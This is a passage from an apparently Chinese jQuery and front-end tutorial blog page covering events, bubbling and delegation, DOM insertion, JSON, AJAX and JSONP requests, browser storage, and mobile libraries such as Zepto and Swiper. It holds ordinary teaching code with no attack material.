class="line">blur() 元素失去焦点</span><br><span class="line">focus() 元素获得焦点</span><br><span class="line">click() 鼠标单击</span><br><span class="line">mouseover() 鼠标进入（进入子元素也触发）</span><br><span class="line">mouseout() 鼠标离开（离开子元素也触发）</span><br><span class="line">mouseenter() 鼠标进入（进入子元素不触发）</span><br><span class="line">mouseleave() 鼠标离开（离开子元素不触发）</span><br><span class="line">hover() 同时为mouseenter和mouseleave事件指定处理函数</span><br><span class="line">ready() DOM加载完成</span><br><span class="line">resize() 浏览器窗口的大小发生改变</span><br><span class="line">scroll() 滚动条的位置发生变化</span><br><span class="line">submit() 用户递交表单</span><br></pre></td></tr></table></figure><h3 id="10-12-2-绑定事件的其他方式"><a href="#10-12-2-绑定事件的其他方式" class="headerlink" title="10.12.2 绑定事件的其他方式"></a>10.12.2 <strong>绑定事件的其他方式</strong></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    $(<span class="string">'#div1'</span>).bind(<span class="string">'mouseover click'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">        alert($(<span class="keyword">this</span>).html());</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="10-12-3-取消绑定事件"><a href="#10-12-3-取消绑定事件" class="headerlink" title="10.12.3 取消绑定事件"></a>10.12.3 <strong>取消绑定事件</strong></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    $(<span class="string">'#div1'</span>).bind(<span class="string">'mouseover click'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">        alert($(<span class="keyword">this</span>).html());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// $(this).unbind();</span></span><br><span class="line">        $(<span class="keyword">this</span>).unbind(<span class="string">'mouseover'</span>);</span><br><span class="line"></span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="10-13-事件冒泡"><a href="#10-13-事件冒泡" class="headerlink" title="10.13 事件冒泡"></a>10.13 事件冒泡</h2><h3 id="10-13-1-什么是事件冒泡"><a href="#10-13-1-什么是事件冒泡" class="headerlink" title="10.13.1 什么是事件冒泡"></a>10.13.1 <strong>什么是事件冒泡</strong></h3><p>在一个对象上触发某类事件（比如单击onclick事件），如果此对象定义了此事件的处理程序，那么此事件就会调用这个处理程序，如果没有定义此事件处理程序或者事件返回true，那么这个事件会向这个对象的父级对象传播，从里到外，直至它被处理（父级对象所有同类事件都将被激活），或者它到达了对象层次的最顶层，即document对象（有些浏览器是window）。</p><h3 id="10-13-2-事件冒泡的作用"><a href="#10-13-2-事件冒泡的作用" class="headerlink" title="10.13.2 事件冒泡的作用"></a>10.13.2 <strong>事件冒泡的作用</strong></h3><p>事件冒泡允许多个操作被集中处理（把事件处理器添加到一个父级元素上，避免把事件处理器添加到多个子级元素上），它还可以让你在对象层的不同级别捕获事件。</p><h3 id="10-13-3-阻止事件冒泡"><a href="#10-13-3-阻止事件冒泡" class="headerlink" title="10.13.3 阻止事件冒泡"></a>10.13.3 <strong>阻止事件冒泡</strong></h3><p>事件冒泡机制有时候是不需要的，需要阻止掉，通过 event.stopPropagation() 来阻止</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $box1 = $(<span class="string">'.father'</span>);</span><br><span class="line">    <span class="keyword">var</span> $box2 = $(<span class="string">'.son'</span>);</span><br><span class="line">    <span class="keyword">var</span> $box3 = $(<span class="string">'.grandson'</span>);</span><br><span class="line">    $box1.click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        alert(<span class="string">'father'</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">    $box2.click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        alert(<span class="string">'son'</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">    $box3.click(<span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">        alert(<span class="string">'grandson'</span>);</span><br><span class="line">        event.stopPropagation();</span><br><span class="line"></span><br><span class="line">    &#125;);</span><br><span class="line">    $(<span class="built_in">document</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">        alert(<span class="string">'grandfather'</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"father"</span>&gt;</span><br><span class="line">    &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"son"</span>&gt;</span><br><span class="line">        &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"grandson"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">    &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>div&gt;</span><br></pre></td></tr></table></figure><h3 id="10-13-4-阻止默认行为"><a href="#10-13-4-阻止默认行为" class="headerlink" title="10.13.4 阻止默认行为"></a>10.13.4 <strong>阻止默认行为</strong></h3><p>阻止表单提交</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">'#form1'</span>).submit(<span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">    event.preventDefault();</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="10-14-5-合并阻止操作"><a href="#10-14-5-合并阻止操作" class="headerlink" title="10.14.5 合并阻止操作"></a>10.14.5 <strong>合并阻止操作</strong></h3><p>实际开发中，一般把阻止冒泡和阻止默认行为合并起来写，合并写法可以用</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// event.stopPropagation();</span></span><br><span class="line"><span class="comment">// event.preventDefault();</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 合并写法：</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br></pre></td></tr></table></figure><h2 id="10-14-事件委托"><a href="#10-14-事件委托" class="headerlink" title="10.14 事件委托"></a>10.14 事件委托</h2><p>事件委托就是利用冒泡的原理，把事件加到父级上，通过判断事件来源的子集，执行相应的操作，事件委托首先可以极大减少事件绑定次数，提高性能；其次可以让新加入的子元素也可以拥有相同的操作。</p><h3 id="10-14-1-一般绑定事件的写法"><a href="#10-14-1-一般绑定事件的写法" class="headerlink" title="10.14.1 一般绑定事件的写法"></a>10.14.1 <strong>一般绑定事件的写法</strong></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    $ali = $(<span class="string">'#list li'</span>);</span><br><span class="line">    $ali.click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $(<span class="keyword">this</span>).css(&#123;<span class="attr">background</span>:<span class="string">'red'</span>&#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;)</span><br><span class="line">...</span><br><span class="line">&lt;ul id=<span class="string">"list"</span>&gt;</span><br><span class="line">    &lt;li&gt;<span class="number">1</span>&lt;<span class="regexp">/li&gt;</span></span><br><span class="line"><span class="regexp">    &lt;li&gt;2&lt;/</span>li&gt;</span><br><span class="line">    &lt;li&gt;<span class="number">3</span>&lt;<span class="regexp">/li&gt;</span></span><br><span class="line"><span class="regexp">    &lt;li&gt;4&lt;/</span>li&gt;</span><br><span class="line">    &lt;li&gt;<span class="number">5</span>&lt;<span class="regexp">/li&gt;</span></span><br><span class="line"><span class="regexp">&lt;/u</span>l&gt;</span><br></pre></td></tr></table></figure><h3 id="10-14-2-事件委托的写法"><a href="#10-14-2-事件委托的写法" class="headerlink" title="10.14.2 事件委托的写法"></a>10.14.2 <strong>事件委托的写法</strong></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    $list = $(<span class="string">'#list'</span>);</span><br><span class="line">    $list.delegate(<span class="string">'li'</span>, <span class="string">'click'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $(<span class="keyword">this</span>).css(&#123;<span class="attr">background</span>:<span class="string">'red'</span>&#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;)</span><br><span class="line">...</span><br><span class="line">&lt;ul id=<span class="string">"list"</span>&gt;</span><br><span class="line">    &lt;li&gt;<span class="number">1</span>&lt;<span class="regexp">/li&gt;</span></span><br><span class="line"><span class="regexp">    &lt;li&gt;2&lt;/</span>li&gt;</span><br><span class="line">    &lt;li&gt;<span class="number">3</span>&lt;<span class="regexp">/li&gt;</span></span><br><span class="line"><span class="regexp">    &lt;li&gt;4&lt;/</span>li&gt;</span><br><span class="line">    &lt;li&gt;<span class="number">5</span>&lt;<span class="regexp">/li&gt;</span></span><br><span class="line"><span class="regexp">&lt;/u</span>l&gt;</span><br></pre></td></tr></table></figure><h2 id="10-15-jquery元素节点操作"><a href="#10-15-jquery元素节点操作" class="headerlink" title="10.15 jquery元素节点操作"></a>10.15 jquery元素节点操作</h2><h3 id="10-15-1-创建节点"><a href="#10-15-1-创建节点" class="headerlink" title="10.15.1 创建节点"></a>10.15.1 <strong>创建节点</strong></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> $div = $(<span class="string">'&lt;div&gt;'</span>);</span><br><span class="line"><span class="keyword">var</span> $div2 = $(<span class="string">'&lt;div&gt;这是一个div元素&lt;/div&gt;'</span>);</span><br></pre></td></tr></table></figure><h3 id="10-15-2-插入节点"><a href="#10-15-2-插入节点" class="headerlink" title="10.15.2 插入节点"></a>10.15.2 <strong>插入节点</strong></h3><p>1、append()和appendTo()：在现存元素的内部，从后面插入元素</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> $span = $(<span class="string">'&lt;span&gt;这是一个span元素&lt;/span&gt;'</span>);</span><br><span class="line">$(<span class="string">'#div1'</span>).append($span);</span><br><span class="line">......</span><br><span class="line">&lt;div id=<span class="string">"div1"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>2、prepend()和prependTo()：在现存元素的内部，从前面插入元素</p><p>3、after()和insertAfter()：在现存元素的外部，从后面插入元素</p><p>4、before()和insertBefore()：在现存元素的外部，从前面插入元素</p><h3 id="10-15-3-删除节点"><a href="#10-15-3-删除节点" class="headerlink" title="10.15.3 删除节点"></a>10.15.3 <strong>删除节点</strong></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">'#div1'</span>).remove();</span><br></pre></td></tr></table></figure><h2 id="10-16-滚轮事件与函数节流"><a href="#10-16-滚轮事件与函数节流" class="headerlink" title="10.16 滚轮事件与函数节流"></a>10.16 滚轮事件与函数节流</h2><h3 id="10-16-1-jquery-mousewheel插件使用"><a href="#10-16-1-jquery-mousewheel插件使用" class="headerlink" title="10.16.1 jquery.mousewheel插件使用"></a>10.16.1 <strong>jquery.mousewheel插件使用</strong></h3><p>jquery中没有鼠标滚轮事件，原生js中的鼠标滚轮事件不兼容，可以使用jquery的滚轮事件插件jquery.mousewheel.js。</p><h3 id="10-16-2-函数节流"><a href="#10-16-2-函数节流" class="headerlink" title="10.16.2 函数节流"></a>10.16.2 <strong>函数节流</strong></h3><p>javascript中有些事件的触发频率非常高，比如onresize事件(jq中是resize)，onmousemove事件(jq中是mousemove)以及上面说的鼠标滚轮事件，在短事件内多处触发执行绑定的函数，可以巧妙地使用定时器来减少触发的次数，实现函数节流。</p><h2 id="10-17-json"><a href="#10-17-json" class="headerlink" title="10.17 json"></a>10.17 json</h2><p>json是 JavaScript Object Notation 的首字母缩写，单词的意思是javascript对象表示法，这里说的json指的是类似于javascript对象的一种数据格式，目前这种数据格式比较流行，逐渐替换掉了传统的xml数据格式。</p><p>javascript自定义对象：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> oMan = &#123;</span><br><span class="line">    name:<span class="string">'tom'</span>,</span><br><span class="line">    age:<span class="number">16</span>,</span><br><span class="line">    talk:<span class="function"><span class="keyword">function</span>(<span class="params">s</span>)</span>&#123;</span><br><span class="line">        alert(<span class="string">'我会说'</span>+s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>json格式的数据：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">"name"</span>:<span class="string">"tom"</span>,</span><br><span class="line">    <span class="string">"age"</span>:<span class="number">18</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>与json对象不同的是，json数据格式的属性名称和字符串值需要用双引号引起来，用单引号或者不用引号会导致读取数据错误。</p><p>json的另外一个数据格式是数组，和javascript中的数组字面量相同。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">"tom"</span>,<span class="number">18</span>,<span class="string">"programmer"</span>]</span><br></pre></td></tr></table></figure><h2 id="10-18-ajax与jsonp"><a href="#10-18-ajax与jsonp" class="headerlink" title="10.18 ajax与jsonp"></a>10.18 ajax与jsonp</h2><p>ajax技术的目的是让javascript发送http请求，与后台通信，获取数据和信息。ajax技术的原理是实例化xmlhttp对象，使用此对象与后台通信。ajax通信的过程不会影响后续javascript的执行，从而实现异步。</p><h3 id="10-18-1-同步和异步"><a href="#10-18-1-同步和异步" class="headerlink" title="10.18.1 同步和异步"></a>10.18.1 <strong>同步和异步</strong></h3><p>现实生活中，同步指的是同时做几件事情，异步指的是做完一件事后再做另外一件事，程序中的同步和异步是把现实生活中的概念对调，也就是程序中的异步指的是现实生活中的同步，程序中的同步指的是现实生活中的异步。</p><h3 id="10-18-2-局部刷新和无刷新"><a href="#10-18-2-局部刷新和无刷新" class="headerlink" title="10.18.2 局部刷新和无刷新"></a>10.18.2 <strong>局部刷新和无刷新</strong></h3><p>ajax可以实现局部刷新，也叫做无刷新，无刷新指的是整个页面不刷新，只是局部刷新，ajax可以自己发送http请求，不用通过浏览器的地址栏，所以页面整体不会刷新，ajax获取到后台数据，更新页面显示数据的部分，就做到了页面局部刷新。</p><h3 id="10-18-3-同源策略"><a href="#10-18-3-同源策略" class="headerlink" title="10.18.3 同源策略"></a>10.18.3 <strong>同源策略</strong></h3><p>ajax请求的页面或资源只能是同一个域下面的资源，不能是其他域的资源，这是在设计ajax时基于安全的考虑。特征报错提示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">XMLHttpRequest cannot load https://www.baidu.com/. No  </span><br><span class="line">&apos;Access-Control-Allow-Origin&apos; header is present on the requested resource.  </span><br><span class="line">Origin &apos;null&apos; is therefore not allowed access.</span><br></pre></td></tr></table></figure><h3 id="10-18-4-ajax使用方法"><a href="#10-18-4-ajax使用方法" class="headerlink" title="10.18.4 $.ajax使用方法"></a>10.18.4 <strong>$.ajax使用方法</strong></h3><p>常用参数：<br>1、url 请求地址<br>2、type 请求方式，默认是’GET’，常用的还有’POST’<br>3、dataType 设置返回的数据格式，常用的是’json’格式，也可以设置为’html’<br>4、data 设置发送给服务器的数据<br>5、success 设置请求成功后的回调函数<br>6、error 设置请求失败后的回调函数<br>7、async 设置是否异步，默认值是’true’，表示异步</p><p>以前的写法：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$.ajax(&#123;</span><br><span class="line">    url: <span class="string">'js/data.json'</span>,</span><br><span class="line">    type: <span class="string">'GET'</span>,</span><br><span class="line">    dataType: <span class="string">'json'</span>,</span><br><span class="line">    data:&#123;<span class="string">'aa'</span>:<span class="number">1</span>&#125;</span><br><span class="line">    success:<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">        alert(data.name);</span><br><span class="line">    &#125;,</span><br><span class="line">    error:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        alert(<span class="string">'服务器超时，请重试！'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>新的写法(推荐)：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$.ajax(&#123;</span><br><span class="line">    url: &apos;js/data.json&apos;,</span><br><span class="line">    type: &apos;GET&apos;,</span><br><span class="line">    dataType: &apos;json&apos;,</span><br><span class="line">    data:&#123;&apos;aa&apos;:1&#125;</span><br><span class="line">&#125;)</span><br><span class="line">.done(function(data) &#123;</span><br><span class="line">    alert(data.name);</span><br><span class="line">&#125;)</span><br><span class="line">.fail(function() &#123;</span><br><span class="line">    alert(&apos;服务器超时，请重试！&apos;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">// data.json里面的数据： &#123;&quot;name&quot;:&quot;tom&quot;,&quot;age&quot;:18&#125;</span><br></pre></td></tr></table></figure><h3 id="10-18-5-jsonp"><a href="#10-18-5-jsonp" class="headerlink" title="10.18.5 jsonp"></a>10.18.5 <strong>jsonp</strong></h3><p>ajax只能请求同一个域下的数据或资源，有时候需要跨域请求数据，就需要用到jsonp技术，jsonp可以跨域请求数据，它的原理主要是利用了<script>标签可以跨域链接资源的特性。jsonp和ajax原理完全不一样，不过jquery将它们封装成同一个函数。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$.ajax(&#123;</span><br><span class="line">    url:<span class="string">'js/data.js'</span>,</span><br><span class="line">    type:<span class="string">'get'</span>,</span><br><span class="line">    dataType:<span class="string">'jsonp'</span>,</span><br><span class="line">    jsonpCallback:<span class="string">'fnBack'</span></span><br><span class="line">&#125;)</span><br><span class="line">.done(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">    alert(data.name);</span><br><span class="line">&#125;)</span><br><span class="line">.fail(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    alert(<span class="string">'服务器超时，请重试！'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// data.js里面的数据： fnBack(&#123;"name":"tom","age":18&#125;);</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    $(<span class="string">'#txt01'</span>).keyup(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> sVal = $(<span class="keyword">this</span>).val();</span><br><span class="line">        $.ajax(&#123;</span><br><span class="line">            url:<span class="string">'https://sug.so.360.cn/suggest?'</span>,</span><br><span class="line">            type:<span class="string">'get'</span>,</span><br><span class="line">            dataType:<span class="string">'jsonp'</span>,</span><br><span class="line">            data: &#123;<span class="attr">word</span>: sVal&#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        .done(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">            <span class="keyword">var</span> aData = data.s;</span><br><span class="line">            $(<span class="string">'.list'</span>).empty();</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;aData.length;i++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">var</span> $li = $(<span class="string">'&lt;li&gt;'</span>+ aData[i] +<span class="string">'&lt;/li&gt;'</span>);</span><br><span class="line">                $li.appendTo($(<span class="string">'.list'</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)        </span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">//......</span></span><br><span class="line"></span><br><span class="line">&lt;input type=<span class="string">"text"</span> name=<span class="string">""</span> id=<span class="string">"txt01"</span>&gt;</span><br><span class="line">&lt;ul <span class="class"><span class="keyword">class</span></span>=<span class="string">"list"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h2 id="10-19-本地存储"><a href="#10-19-本地存储" class="headerlink" title="10.19 本地存储"></a>10.19 本地存储</h2><p>本地存储分为cookie，以及新增的localStorage和sessionStorage</p><p>1、cookie 存储在本地，容量最大4k，在同源的http请求时携带传递，损耗带宽，可设置访问路径，只有此路径及此路径的子路径才能访问此cookie，在设置的过期时间之前有效。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">jquery 设置cookie</span><br><span class="line">$.cookie(<span class="string">'mycookie'</span>,<span class="string">'123'</span>,&#123;<span class="attr">expires</span>:<span class="number">7</span>,<span class="attr">path</span>:<span class="string">'/'</span>&#125;);</span><br><span class="line">jquery 获取cookie</span><br><span class="line">$.cookie(<span class="string">'mycookie'</span>);</span><br></pre></td></tr></table></figure><p>2、localStorage 存储在本地，容量为5M或者更大，不会在请求时候携带传递，在所有同源窗口中共享，数据一直有效，除非人为删除，可作为长期数据。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//设置：</span></span><br><span class="line">localStorage.setItem(<span class="string">"dat"</span>, <span class="string">"456"</span>);</span><br><span class="line">localStorage.dat = <span class="string">'456'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取：</span></span><br><span class="line">localStorage.getItem(<span class="string">"dat"</span>);</span><br><span class="line">localStorage.dat</span><br><span class="line"></span><br><span class="line"><span class="comment">//删除</span></span><br><span class="line">localStorage.removeItem(<span class="string">"dat"</span>);</span><br></pre></td></tr></table></figure><p>3、sessionStorage 存储在本地，容量为5M或者更大，不会在请求时候携带传递，在同源的当前窗口关闭前有效。</p><p>localStorage 和 sessionStorage 合称为Web Storage , Web Storage支持事件通知机制，可以将数据更新的通知监听者，Web Storage的api接口使用更方便。</p><p>iPhone的无痕浏览不支持Web Storage，只能用cookie。</p><h2 id="10-20-jqueryUI"><a href="#10-20-jqueryUI" class="headerlink" title="10.20 jqueryUI"></a>10.20 jqueryUI</h2><p>jQuery UI是以 jQuery 为基础的代码库。包含底层用户交互、动画、特效和可更换主题的可视控件。我们可以直接用它来构建具有很好交互性的web应用程序。</p><p> <strong>jqueryUI 网址</strong><br><a href="http://jqueryui.com/">http://jqueryui.com/</a></p><h1 id="11-移动端库和框架"><a href="#11-移动端库和框架" class="headerlink" title="11.移动端库和框架"></a>11.移动端库和框架</h1><h2 id="11-1-移动端js事件"><a href="#11-1-移动端js事件" class="headerlink" title="11.1 移动端js事件"></a>11.1 移动端js事件</h2><p>移动端的操作方式和PC端是不同的，移动端主要用手指操作，所以有特殊的touch事件，touch事件包括如下几个事件：</p><p>1、touchstart:     //手指放到屏幕上时触发<br>2、touchmove:      //手指在屏幕上滑动式触发<br>3、touchend:    //手指离开屏幕时触发<br>4、touchcancel:     //系统取消touch事件的时候触发，比较少用  </p><p>移动端一般有三种操作，点击、滑动、拖动，这三种操作一般是组合使用上面的几个事件来完成的，所有上面的4个事件一般很少单独使用，一般是封装使用来实现这三种操作，可以使用封装成熟的js库。</p><h2 id="11-2-zeptojs"><a href="#11-2-zeptojs" class="headerlink" title="11.2 zeptojs"></a>11.2 zeptojs</h2><p>Zepto是一个轻量级的针对现代高级浏览器的JavaScript库， 它与jquery有着类似的api。  如果你会用jquery，那么你也会用zepto。Zepto的一些可选功能是专门针对移动端浏览器的；它的最初目标是在移动端提供一个精简的类似jquery的js库。</p><p>zepto官网：<a href="http://zeptojs.com/">http://zeptojs.com/</a><br>zepto中文api：<a href="http://www.css88.com/doc/zeptojs_api/">http://www.css88.com/doc/zeptojs_api/</a><br>zepto包含很多模块，默认下载版本包含的模块有Core, Ajax, Event, Form, IE模块，如果还需要其他的模块，可以自定义构建。<br>zepto自定义构建地址：<a href="http://github.e-sites.nl/zeptobuilder/">http://github.e-sites.nl/zeptobuilder/</a>  </p><h2 id="11-3-swiper"><a href="#11-3-swiper" class="headerlink" title="11.3 swiper"></a>11.3 swiper</h2><p>swiper.js是一款成熟稳定的应用于PC端和移动端的滑动效果插件，一般用来触屏焦点图、触屏整屏滚动等效果。 swiper分为2.x版本和3.x版本，2.x版本支持低版本浏览器(IE7)，3.x放弃支持低版本浏览器，适合应用在移动端。</p><p>2.x版本中文网址：<a href="http://2.swiper.com.cn/">http://2.swiper.com.cn/</a><br>3.x版本中文网地址：<a href="http://www.swiper.com.cn/">http://www.swiper.com.cn/</a></p><h3 id="11-3-1-swiper使用方法："><a href="#11-3-1-swiper使用方法：" class="headerlink" title="11.3.1  swiper使用方法："></a>11.3.1  swiper使用方法：</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 